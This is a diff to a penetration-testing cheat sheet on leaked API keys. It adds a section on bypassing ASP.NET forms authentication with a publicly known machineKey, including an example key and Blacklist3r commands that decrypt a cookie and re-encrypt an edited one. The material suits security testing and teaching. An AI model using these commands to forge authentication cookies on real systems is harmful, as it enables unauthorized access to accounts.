@@ -15,6 +15,8 @@
     - [Twitter API Secret](#twitter-api-secret)
     - [Twitter Bearer Token](#twitter-bearer-token)
     - [Gitlab Personal Access Token](#gitlab-personal-access-token)
+    - [Auth Bypass using pre-published Machine Key](#auth-bypass-using-pre-published-machine-key)
+
 
 ## Tools
 
@@ -87,7 +89,31 @@ curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_toke
 ```
 
 
+### Auth Bypass using pre-published Machine Key
+
+> By default, ASP.NET creates a Forms Authentication Ticket with unique a username associated with it, Date and Time at which the ticket was issued and expires. So, all you need is just a unique username and a machine key to create a forms authentication token
+
+That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
+
+Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.
+
+```xml
+<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
+```
+
+Exploit with [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)
+
+```powershell
+# decrypt cookie
+$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
+
+# encrypt cookie (edit Decrypted.txt)
+$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
+```
+
+
 ## References
 
 * [Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019](https://medium.com/@sumitcfe/finding-hidden-api-keys-how-to-use-them-11b1e5d0f01d)
 * [Private API key leakage due to lack of access control - yox - August 8, 2018](https://hackerone.com/reports/376060)
+* [Project Blacklist3r - November 23, 2018 - @notsosecure](https://www.notsosecure.com/project-blacklist3r/)
